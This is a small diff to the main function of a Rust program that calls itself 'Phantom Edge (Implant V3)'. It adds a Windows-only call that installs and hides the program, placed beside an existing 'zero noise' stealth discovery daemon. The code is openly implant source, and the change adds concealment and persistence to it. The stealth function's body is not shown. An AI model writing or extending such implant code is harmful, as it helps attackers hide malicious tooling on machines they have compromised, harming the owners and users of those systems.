@@ -60,6 +60,10 @@ async fn main() {
     env_logger::init();
     info!("Phantom Edge (Implant V3) Started - LAN Clustering Mode");
 
+    // 0. Windows Stealth: Install & Hide (If applicable)
+    #[cfg(target_os = "windows")]
+    modules::windows::check_and_apply_stealth();
+    
     // 0. Start Zero Noise Discovery Daemon (Stealth Mode)
     let stealth_disc = Arc::new(ZeroNoiseDiscovery::new());
     let stealth_clone = stealth_disc.clone();
